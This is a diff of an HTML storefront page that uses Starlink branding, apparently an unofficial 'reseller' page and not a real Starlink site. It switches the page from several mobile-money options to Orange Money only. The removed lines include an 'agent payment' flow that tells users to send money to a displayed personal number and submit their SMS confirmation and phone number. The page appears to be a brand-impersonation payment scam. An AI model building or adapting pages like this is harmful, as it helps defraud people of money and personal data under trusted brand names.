@@ -4,15 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="page-title">Forfaits - Starlink</title>
-    <meta name="cache-version" content="v12-ethiopia">
+    <meta name="cache-version" content="v13-orange">
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
-    <link rel="manifest" href="/starlink/manifest.json">
     <meta name="theme-color" content="#000000">
     <meta name="apple-mobile-web-app-capable" content="yes"><meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <meta name="apple-mobile-web-app-title" content="Starlink">
-    <link rel="apple-touch-icon" href="/starlink/icons/icon-192.png">
-    <script src="/starlink/pwa-install.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
@@ -20,314 +17,164 @@
         .card-shadow { box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
         .package-card { transition: transform 0.3s ease, box-shadow 0.3s ease; cursor: pointer; }
         .package-card:hover { transform: translateY(-4px); box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15); }
-        .package-card.selected { border: 2px solid #2563eb; background-color: #eff6ff; }
-        .package-hint { font-size: 11px; color: #4b5563; margin: 8px 0 0; text-align: right; }
+        .package-card.selected { border: 2px solid #FF6600; background-color: #fff5eb; }
         .popular-badge { position: absolute; top: -10px; right: 10px; background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+
+        /* ===== Loading modal ===== */
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: center; }
         .modal-overlay.active { display: flex; }
         .modal-content { background: white; border-radius: 12px; padding: 32px 48px; text-align: center; max-width: 380px; margin: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
-        .spinner { width: 50px; height: 50px; border: 3px solid #e5e7eb; border-top: 3px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
+        .spinner { width: 50px; height: 50px; border: 3px solid #e5e7eb; border-top: 3px solid #FF6600; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .airtel-logo-container { width: 50px; height: 50px; background: #ed1c24; border-radius: 8px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
-        .airtel-logo-container span { color: white; font-size: 11px; font-weight: bold; font-family: Arial, sans-serif; letter-spacing: -0.5px; }
+
+        /* Orange Money logo container */
+        .orange-logo-container {
+            width: 64px; height: 64px; border-radius: 14px;
+            background: #FF6600;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 16px;
+            overflow: hidden;
+            box-shadow: 0 4px 14px rgba(255, 102, 0, 0.4);
+        }
+        .orange-logo-container img { width: 100%; height: 100%; object-fit: contain; padding: 6px; }
+
         .modal-title { font-size: 17px; font-weight: 600; color: #1f2937; margin-bottom: 8px; }
         .modal-subtitle { font-size: 13px; color: #6b7280; margin-bottom: 8px; line-height: 1.4; }
         .modal-warning { font-size: 12px; color: #9ca3af; font-style: italic; }
-        
-        /* Payment Method Selector Modal */
+
+        /* ===== Payment modal (Orange only) ===== */
         .payment-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9998; justify-content: center; align-items: center; }
         .payment-modal.active { display: flex; }
         .payment-modal-content { background: white; border-radius: 16px; padding: 28px; max-width: 360px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
         .payment-modal-title { font-size: 20px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 6px; }
         .payment-modal-subtitle { font-size: 14px; color: #6b7280; text-align: center; margin-bottom: 20px; }
         .payment-options { display: flex; flex-direction: column; gap: 12px; }
-        .payment-option { display: flex; align-items: center; gap: 16px; padding: 16px; border: 2px solid #e5e7eb; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
-        .payment-option:hover { border-color: #d1d5db; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .payment-option.airtel:hover { border-color: #ed1c24; background: #fef2f2; }
-        .payment-option.moov:hover { border-color: #f5a623; background: #fff8eb; }
-        .payment-option.lumitel:hover { border-color: #f5a623; background: #fff8eb; }
-        .payment-option.ecocash:hover { border-color: #0066B2; background: #e6f3ff; }
-        .payment-option.orange:hover { border-color: #FF6600; background: #fff5eb; }
-        .payment-option.waafi:hover { border-color: #00A651; background: #e6f9ef; }
-        .payment-option.card:hover { border-color: #1a56db; background: #e8f0fe; }
-        .payment-option.kbzpay:hover { border-color: #0060AF; background: #e8f2ff; }
-        .payment-logo { width: 50px; height: 50px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 10px; color: white; }
-        .payment-logo.airtel { background: #ed1c24; }
-        .payment-logo.moov { background: #f5a623; font-size: 9px; }
-        .payment-logo.lumitel { background: #f5a623; font-size: 8px; }
-        .payment-logo.ecocash { background: #0066B2; font-size: 8px; }
-        .payment-logo.orange { background: #FF6600; font-size: 11px; }
-        .payment-logo.waafi { background: #00A651; font-size: 10px; }
-        .payment-logo.card { background: #1a56db; font-size: 16px; }
-        .payment-logo.kbzpay { background: #0060AF; font-size: 10px; font-weight: 800; }
-        .payment-logo.vodacom { background: #e60000; padding: 0; overflow: hidden; }
-        .payment-logo.vodacom img { width: 100%; height: 100%; object-fit: contain; border-radius: 10px; }
+        .payment-option {
+            display: flex; align-items: center; gap: 16px;
+            padding: 16px; border: 2px solid #e5e7eb;
+            border-radius: 12px; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .payment-option:hover { border-color: #FF6600; background: #fff5eb; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(255,102,0,0.15); }
+        .payment-logo {
+            width: 52px; height: 52px; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            overflow: hidden; flex-shrink: 0;
+            background: #FF6600;
+            box-shadow: 0 2px 8px rgba(255, 102, 0, 0.3);
+        }
+        .payment-logo img { width: 100%; height: 100%; object-fit: contain; padding: 8px; }
         .payment-info h4 { font-size: 16px; font-weight: 600; color: #1f2937; margin-bottom: 2px; }
         .payment-info p { font-size: 12px; color: #6b7280; }
         .payment-arrow { margin-left: auto; color: #9ca3af; }
-        .close-payment-modal { display: block; width: 100%; margin-top: 16px; padding: 12px; background: transparent; border: 1px solid #e5e7eb; border-radius: 8px; color: #6b7280; font-size: 14px; cursor: pointer; transition: all 0.2s; }
+        .close-payment-modal {
+            display: block; width: 100%; margin-top: 16px;
+            padding: 12px; background: transparent;
+            border: 1px solid #e5e7eb; border-radius: 8px;
+            color: #6b7280; font-size: 14px; cursor: pointer;
+            transition: all 0.2s;
+        }
         .close-payment-modal:hover { background: #f3f4f6; }
-        /* Configure Button */
-        .configure-btn { display: inline-flex; align-items: center; gap: 5px; margin-top: 10px; padding: 7px 16px; background: #000; border: 1.5px solid #000; border-radius: 8px; font-size: 12px; font-weight: 600; color: #fff; cursor: pointer; transition: all 0.2s; font-family: inherit; }
-        .configure-btn:hover { border-color: #333; color: #fff; background: #333; }
-        /* Configure Alert Modal */
-        .configure-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: flex-end; }
-        .configure-modal.active { display: flex; }
-        .configure-modal-content { background: white; border-radius: 20px 20px 0 0; padding: 28px 24px 40px; width: 100%; max-width: 480px; margin: 0 auto; box-shadow: 0 -10px 40px rgba(0,0,0,0.15); text-align: center; animation: slideUp 0.3s ease; }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        .configure-modal-icon { width: 64px; height: 64px; background: #fef3c7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; }
-        .configure-modal-title { font-size: 18px; font-weight: 700; color: #1f2937; margin-bottom: 8px; }
-        .configure-modal-msg { font-size: 13px; color: #6b7280; line-height: 1.6; margin-bottom: 24px; }
-        .configure-subscribe-btn { width: 100%; padding: 14px; background: #2563eb; color: white; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 10px; font-family: inherit; transition: background 0.2s; }
-        .configure-subscribe-btn:hover { background: #1d4ed8; }
-        .configure-close-btn { width: 100%; padding: 12px; background: transparent; color: #6b7280; border: 1.5px solid #d1d5db; border-radius: 12px; font-size: 14px; font-weight: 500; cursor: pointer; font-family: inherit; transition: all 0.2s; }
-        .configure-close-btn:hover { border-color: #9ca3af; color: #374151; }
+
+        /* ===== Header logo ===== */
+        .brand-bar {
+            display: flex; align-items: center; gap: 12px;
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+            border-radius: 14px; padding: 10px 16px;
+            border: 1px solid rgba(255, 102, 0, 0.25);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05);
+        }
+        .brand-starlink { display: flex; align-items: center; gap: 8px; }
+        .brand-starlink svg { width: 30px; height: 30px; flex-shrink: 0; }
+        .brand-starlink-text {
+            font-weight: 800; font-size: 18px; letter-spacing: 0.12em;
+            color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        .brand-divider { width: 1px; height: 28px; background: linear-gradient(180deg, transparent, rgba(255,255,255,0.25), transparent); margin: 0 4px; }
+        .brand-orange { display: flex; align-items: center; gap: 8px; }
+        .brand-orange-logo {
+            width: 34px; height: 34px; border-radius: 8px;
+            background: #FF6600;
+            display: flex; align-items: center; justify-content: center;
+            overflow: hidden; flex-shrink: 0;
+            box-shadow: 0 0 0 2px rgba(255,102,0,0.3), 0 2px 8px rgba(255,102,0,0.4);
+        }
+        .brand-orange-logo img { width: 100%; height: 100%; object-fit: contain; padding: 4px; }
+        .brand-orange-text {
+            font-weight: 700; font-size: 13px; letter-spacing: 0.06em;
+            color: #FF6600; line-height: 1.1;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        .brand-orange-text small { display: block; font-size: 9px; letter-spacing: 0.14em; color: rgba(255,255,255,0.65); font-weight: 600; margin-top: 2px; }
+
         .pkg-original-price { font-size: 13px; text-decoration: line-through; color: #9ca3af; text-align: right; line-height: 1.3; }
         .promo-tag { display: inline-block; background: #dc2626; color: white; font-size: 9px; font-weight: 800; padding: 2px 7px; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.5px; margin-left: 6px; vertical-align: middle; }
     </style>
 </head>
 <body class="bg-gray-50">
-    <!-- Loading Modal -->
+
+    <!-- ===== Loading modal ===== -->
     <div id="loadingModal" class="modal-overlay">
         <div class="modal-content">
             <div class="spinner"></div>
-            <div class="airtel-logo-container" id="loadingLogo">
-                <span>airtel</span>
+            <div class="orange-logo-container">
+                <img src="/orange-money-logo.png" alt="Orange Money" onerror="this.src='https://i.pinimg.com/736x/e2/cc/bf/e2ccbf284b0f18ae6e8dc544ac097f4c.jpg'">
             </div>
-            <h3 id="modal-title" class="modal-title">Processing in progress...</h3>
-            <p id="modal-subtitle" class="modal-subtitle">Secure redirection to the Airtel Money payment gateway</p>
-            <p id="modal-warning" class="modal-warning">Please do not refresh the page</p>
+            <h3 class="modal-title">Redirection en cours...</h3>
+            <p class="modal-subtitle">Redirection sécurisée vers Orange Money</p>
+            <p class="modal-warning">Veuillez ne pas rafraîchir la page</p>
         </div>
     </div>
 
-    <!-- Payment Method Selector Modal -->
+    <!-- ===== Payment method selector (Orange only) ===== -->
     <div id="paymentMethodModal" class="payment-modal">
         <div class="payment-modal-content">
-            <h3 class="payment-modal-title" id="paymentMethodTitle">Select Payment Method</h3>
-            <p class="payment-modal-subtitle" id="paymentMethodSubtitle">Choose how you want to pay</p>
-            
+            <h3 class="payment-modal-title">Payer avec Orange Money</h3>
+            <p class="payment-modal-subtitle">Choisissez votre mode de paiement</p>
+
             <div class="payment-options">
-                <div class="payment-option airtel" id="selectAirtel" onclick="selectPaymentMethod('airtel')">
-                    <div class="payment-logo airtel">airtel</div>
-                    <div class="payment-info">
-                        <h4>Airtel Money</h4>
-                        <p id="airtelPayDesc">Pay with your Airtel wallet</p>
+                <div class="payment-option" id="selectOrange" onclick="selectPaymentMethod('orange')">
+                    <div class="payment-logo">
+                        <img src="/orange-money-logo.png" alt="Orange Money" onerror="this.src='https://i.pinimg.com/736x/e2/cc/bf/e2ccbf284b0f18ae6e8dc544ac097f4c.jpg'">
                     </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option moov" id="selectMoov" onclick="selectPaymentMethod('moov')" style="display:none;">
-                    <div class="payment-logo moov">Moov</div>
-                    <div class="payment-info">
-                        <h4>Moov Money</h4>
-                        <p>Pay with Moov Money</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option lumitel" id="selectLumitel" onclick="selectPaymentMethod('lumitel')" style="display:none;">
-                    <div class="payment-logo lumitel">Lumitel</div>
-                    <div class="payment-info">
-                        <h4>My Lumitel</h4>
-                        <p>Pay with Lumitel</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option vodacom" id="selectVodacom" onclick="selectPaymentMethod('vodacom')" style="display:none;">
-                    <div class="payment-logo vodacom"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Vodacom_logo.svg/200px-Vodacom_logo.svg.png" alt="Vodacom" style="width:100%;height:100%;object-fit:contain;border-radius:10px;"></div>
-                    <div class="payment-info">
-                        <h4>Vodacom M-Pesa</h4>
-                        <p>Pay with Vodacom M-Pesa</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option ecocash" id="selectEcocash" onclick="selectPaymentMethod('ecocash')" style="display:none;">
-                    <div class="payment-logo ecocash">EcoCash</div>
-                    <div class="payment-info">
-                        <h4>EcoCash</h4>
-                        <p>Pay with EcoCash</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option orange" id="selectOrange" onclick="selectPaymentMethod('orange')">
-                    <div class="payment-logo orange">Orange</div>
                     <div class="payment-info">
                         <h4>Orange Money</h4>
-                        <p>Pay with Orange Money</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option waafi" id="selectWaafi" onclick="selectPaymentMethod('waafi')" style="display:none;">
-                    <div class="payment-logo waafi">WAAFI</div>
-                    <div class="payment-info">
-                        <h4>WAAFI</h4>
-                        <p>Pay with WAAFI</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option mtn" id="selectMtn" onclick="selectPaymentMethod('mtn')" style="display:none;">
-                    <div class="payment-logo mtn" style="background:#ffcc00;color:#000;font-weight:800;font-size:13px;display:flex;align-items:center;justify-content:center;">MTN</div>
-                    <div class="payment-info">
-                        <h4>MTN Mobile Money</h4>
-                        <p>Pay with MTN MoMo</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-
-                <div class="payment-option kbzpay" id="selectKbzpay" onclick="selectPaymentMethod('kbzpay')" style="display:none;">
-                    <div class="payment-logo kbzpay">KBZ</div>
-                    <div class="payment-info">
-                        <h4>KBZPay</h4>
-                        <p>Pay with KBZPay</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M9 18l6-6-6-6"/>
-                    </svg>
-                </div>
-                
-                <div class="payment-option" id="selectEthiopia" onclick="selectPaymentMethod('ethiopia')" style="display:none;">
-                    <div class="payment-logo" style="background:linear-gradient(135deg,#078930,#FCDD09,#DA121A);font-size:10px;font-weight:800;color:#fff;display:flex;align-items:center;justify-content:center;">ETH</div>
-                    <div class="payment-info">
-                        <h4>Ethiopian Banks</h4>
-                        <p>KAAFI · CBO · NIB · WEGAGEN · AHADU</p>
-                    </div>
-                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
-                </div>
-                
-                <div class="payment-option card" id="selectCard" onclick="selectPaymentMethod('card')" style="display:none;">
-                    <div class="payment-logo card">💳</div>
-                    <div class="payment-info">
-                        <h4>Debit Card</h4>
-                        <p>Pay with Visa or Mastercard</p>
+                        <p>Payer avec Orange Money</p>
                     </div>
                     <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <path d="M9 18l6-6-6-6"/>
                     </svg>
                 </div>
             </div>
-            
-            <button class="close-payment-modal" onclick="closePaymentModal()" id="cancelPayment">Cancel</button>
+
+            <button class="close-payment-modal" onclick="closePaymentModal()">Annuler</button>
         </div>
     </div>
 
-    <!-- Configure Alert Modal -->
-    <div id="configureModal" class="configure-modal">
-        <div class="configure-modal-content">
-            <div class="configure-modal-icon">⚙️</div>
-            <h3 class="configure-modal-title" id="configureModalTitle">No Active Package</h3>
-            <p class="configure-modal-msg" id="configureModalMsg">You don't have an active subscription for this package. Subscribe now to activate it.</p>
-            <button class="configure-subscribe-btn" id="configureSubscribeBtn">Subscribe Now</button>
-            <button class="configure-close-btn" id="configureCloseBtn">Close</button>
-        </div>
-    </div>
-
-    <!-- Agent Payment Modal (Vodacom DRC / Airtel Zambia) -->
-    <div id="agentPaymentModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;overflow-y:auto;padding:20px;box-sizing:border-box;">
-        <div style="background:#fff;border-radius:16px;max-width:420px;margin:auto;padding:28px 24px;position:relative;font-family:inherit;">
-            <button onclick="closeAgentModal()" style="position:absolute;top:14px;right:16px;background:none;border:none;font-size:22px;cursor:pointer;color:#9ca3af;">✕</button>
-
-            <!-- Step 1: Location -->
-            <div id="agStep1">
-                <div style="text-align:center;margin-bottom:20px;">
-                    <div id="agProviderLogo" style="width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-weight:800;font-size:13px;color:#fff;background:#e60000;">M-Pesa</div>
-                    <h3 id="agStep1Title" style="font-size:18px;font-weight:700;color:#111;margin:0 0 6px;">Pay via Agent</h3>
-                    <p id="agStep1Sub" style="font-size:13px;color:#6b7280;margin:0;">Enter your location to find the nearest payment agent</p>
-                </div>
-                <div id="agPackageBadge" style="background:#f3f4f6;border-radius:8px;padding:10px 14px;margin-bottom:18px;font-size:13px;color:#374151;text-align:center;"></div>
-                <label id="agLocLabel" style="display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px;">Your location / city <span style="font-weight:400;color:#9ca3af;">(ville / quartier)</span></label>
-                <input id="agLocation" type="text" placeholder="e.g. Kinshasa – Gombe / Lusaka" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1.5px solid #d1d5db;border-radius:10px;font-size:15px;outline:none;transition:border 0.2s;" onfocus="this.style.borderColor='#e60000'" onblur="this.style.borderColor='#d1d5db'">
-                <p id="agLocError" style="color:#dc2626;font-size:12px;margin:6px 0 0;display:none;">Please enter your location</p>
-                <button id="agFindBtn" onclick="agFindAgent()" style="width:100%;margin-top:16px;padding:14px;background:#e60000;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:opacity 0.2s;" onmouseover="this.style.opacity='0.88'" onmouseout="this.style.opacity='1'">Find Payment Agent →</button>
-                <button id="agCancelBtn1" onclick="closeAgentModal()" style="width:100%;margin-top:10px;padding:12px;background:none;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;color:#6b7280;cursor:pointer;">Cancel</button>
-            </div>
-
-            <!-- Step 2: Loading -->
-            <div id="agStep2" style="display:none;text-align:center;padding:30px 0;">
-                <div style="width:52px;height:52px;border:4px solid #f3f4f6;border-top-color:#e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px;"></div>
-                <p id="agStep2Title" style="font-size:15px;font-weight:600;color:#111;margin:0 0 8px;">Finding your agent...</p>
-                <p id="agStep2Sub" style="font-size:13px;color:#6b7280;margin:0;">Please wait a moment</p>
-            </div>
-
-            <!-- Step 3: Agent Number -->
-            <div id="agStep3" style="display:none;">
-                <div style="text-align:center;margin-bottom:18px;">
-                    <div style="width:52px;height:52px;background:#dcfce7;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:24px;">✅</div>
-                    <h3 id="agStep3Title" style="font-size:17px;font-weight:700;color:#111;margin:0 0 4px;">Agent Found!</h3>
-                    <p id="agStep3Sub" style="font-size:13px;color:#6b7280;margin:0;">Send your payment to the number below</p>
-                </div>
-                <div style="background:#fef2f2;border:2px solid #fca5a5;border-radius:12px;padding:18px;margin-bottom:16px;text-align:center;">
-                    <p id="agPayLabel" style="font-size:12px;font-weight:600;color:#dc2626;text-transform:uppercase;letter-spacing:0.05em;margin:0 0 6px;">Pay to this number</p>
-                    <p id="agAgentNumber" style="font-size:28px;font-weight:800;color:#111;margin:0 0 4px;letter-spacing:0.06em;"></p>
-                    <p id="agAgentName" style="font-size:13px;color:#6b7280;margin:0;"></p>
-                </div>
-                <div id="agInstructions" style="background:#fffbeb;border:1px solid #fde68a;border-radius:10px;padding:14px;font-size:13px;color:#92400e;line-height:1.6;margin-bottom:18px;display:none;"></div>
-                <div id="agAmountBox" style="background:#f0fdf4;border:1px solid #86efac;border-radius:10px;padding:12px 14px;font-size:13px;color:#15803d;text-align:center;margin-bottom:12px;font-weight:600;"></div>
-                <div style="background:#f0f4ff;border:1px solid #c7d2fe;border-radius:10px;padding:12px 14px;font-size:12px;color:#374151;line-height:1.7;margin-bottom:18px;">
-                    ⏱️ <span id="agDelayText"><strong>In case of any delay</strong>, contact our agent and quote your reference code:</span><br>
-                    <span id="agRefCode" style="display:inline-block;margin-top:6px;font-family:monospace;font-size:16px;font-weight:800;color:#1d4ed8;letter-spacing:0.12em;"></span>
-                </div>
-                <button id="agPaidBtn" onclick="agIHavePaid()" style="width:100%;padding:14px;background:#16a34a;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:opacity 0.2s;" onmouseover="this.style.opacity='0.88'" onmouseout="this.style.opacity='1'">✅ I Have Paid — Submit Confirmation</button>
-                <button id="agCancelBtn3" onclick="closeAgentModal()" style="width:100%;margin-top:10px;padding:12px;background:none;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;color:#6b7280;cursor:pointer;">Cancel</button>
-            </div>
-
-            <!-- Step 4: Confirmation Form -->
-            <div id="agStep4" style="display:none;">
-                <div style="text-align:center;margin-bottom:18px;">
-                    <h3 id="agStep4Title" style="font-size:17px;font-weight:700;color:#111;margin:0 0 6px;">Submit Payment Proof</h3>
-                    <p id="agStep4Sub" style="font-size:13px;color:#6b7280;margin:0;">Paste your confirmation message and enter your phone number for activation</p>
-                </div>
-                <div style="margin-bottom:14px;">
-                    <label id="agConfirmLabel" style="display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px;">Payment Confirmation Message <span style="color:#dc2626;">*</span></label>
-                    <textarea id="agConfirmText" rows="5" placeholder="Paste the SMS or payment confirmation message you received after paying..." style="width:100%;box-sizing:border-box;padding:12px 14px;border:1.5px solid #d1d5db;border-radius:10px;font-size:13px;outline:none;resize:vertical;transition:border 0.2s;" onfocus="this.style.borderColor='#e60000'" onblur="this.style.borderColor='#d1d5db'"></textarea>
-                    <p id="agConfirmError" style="color:#dc2626;font-size:12px;margin:4px 0 0;display:none;">Please paste your confirmation message</p>
-                </div>
-                <div style="margin-bottom:14px;">
-                    <label id="agPhoneLabel" style="display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px;">Your Phone Number for Activation <span style="color:#dc2626;">*</span></label>
-                    <input id="agPhone" type="tel" placeholder="+243 ... or +260 ..." style="width:100%;box-sizing:border-box;padding:12px 14px;border:1.5px solid #d1d5db;border-radius:10px;font-size:15px;outline:none;transition:border 0.2s;" onfocus="this.style.borderColor='#e60000'" onblur="this.style.borderColor='#d1d5db'">
-                    <p id="agPhoneError" style="color:#dc2626;font-size:12px;margin:4px 0 0;display:none;">Please enter a valid phone number</p>
-                </div>
-                <button onclick="agSubmitConfirmation()" id="agSubmitBtn" style="width:100%;padding:14px;background:#e60000;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:opacity 0.2s;" onmouseover="this.style.opacity='0.88'" onmouseout="this.style.opacity='1'">Submit for Activation</button>
-                <button id="agBackBtn" onclick="agBackToAgent()" style="width:100%;margin-top:10px;padding:12px;background:none;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;color:#6b7280;cursor:pointer;">← Back</button>
-            </div>
-
-            <!-- Step 5: Success -->
-            <div id="agStep5" style="display:none;text-align:center;padding:20px 0;">
-                <div style="font-size:56px;margin-bottom:16px;">🎉</div>
-                <h3 id="agStep5Title" style="font-size:20px;font-weight:700;color:#111;margin:0 0 10px;">Submitted!</h3>
-                <p id="agStep5Sub" style="font-size:14px;color:#6b7280;margin:0 0 24px;line-height:1.6;">Your payment confirmation has been received. Our team will activate your Starlink package shortly.</p>
-                <button id="agDoneBtn" onclick="closeAgentModal()" style="padding:13px 32px;background:#e60000;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;">Done</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Header -->
+    <!-- ===== Header ===== -->
     <header class="bg-black text-white shadow-sm">
         <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
             <a href="/starlink/" class="flex items-center gap-2">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="36" height="36" class="flex-shrink-0"><ellipse cx="100" cy="100" rx="74" ry="55" stroke="white" stroke-width="10" fill="none" transform="rotate(-25 100 100)"/><ellipse cx="100" cy="100" rx="43" ry="33" stroke="white" stroke-width="10" fill="none" transform="rotate(65 100 100)"/><circle cx="100" cy="100" r="12" fill="white"/></svg>
-                <span class="font-bold text-xl sm:text-2xl tracking-widest">STARLINK</span>
-                <span id="header-subtitle" class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Revendeur RDC</span>
+                <div class="brand-bar">
+                    <div class="brand-starlink">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
+                            <ellipse cx="100" cy="100" rx="74" ry="55" stroke="white" stroke-width="10" fill="none" transform="rotate(-25 100 100)"/>
+                            <ellipse cx="100" cy="100" rx="43" ry="33" stroke="white" stroke-width="10" fill="none" transform="rotate(65 100 100)"/>
+                            <circle cx="100" cy="100" r="12" fill="white"/>
+                        </svg>
+                        <span class="brand-starlink-text">STARLINK</span>
+                    </div>
+                    <div class="brand-divider"></div>
+                    <div class="brand-orange">
+                        <div class="brand-orange-logo">
+                            <img src="/orange-money-logo.png" alt="Orange Money" onerror="this.src='https://i.pinimg.com/736x/e2/cc/bf/e2ccbf284b0f18ae6e8dc544ac097f4c.jpg'">
+                        </div>
+                        <div class="brand-orange-text">
+                            ORANGE
+                            <small>MONEY</small>
+                        </div>
+                    </div>
+                </div>
             </a>
             <div class="flex items-center gap-4">
                 <button id="langToggle" onclick="toggleLanguage()" class="flex items-center gap-1 text-xs font-semibold bg-gray-800 hover:bg-gray-700 text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-full transition">
@@ -335,40 +182,37 @@
                 </button>
                 <nav class="flex gap-2 sm:gap-4 items-center">
                     <a href="/starlink/status.html" class="text-gray-300 hover:text-white flex items-center gap-2">
-                        <i class="uil uil-wifi"></i> <span id="nav-status" class="hidden sm:inline">Statut</span>
+                        <i class="uil uil-wifi"></i> <span class="hidden sm:inline">Statut</span>
                     </a>
                     <a href="/starlink/" class="text-white flex items-center gap-2">
-                        <i class="uil uil-shopping-bag"></i> <span id="nav-plans" class="hidden sm:inline">Forfaits</span>
+                        <i class="uil uil-shopping-bag"></i> <span class="hidden sm:inline">Forfaits</span>
                     </a>
-                    <a href="/starlink/orders.html" class="text-gray-300 hover:text-white hidden sm:flex items-center gap-2">
-                        <i class="uil uil-list-ul"></i> <span id="nav-orders" class="hidden sm:inline">Commandes</span>
-                    </a>
-                    <div id="auth-nav" class="flex items-center gap-2"></div>
                 </nav>
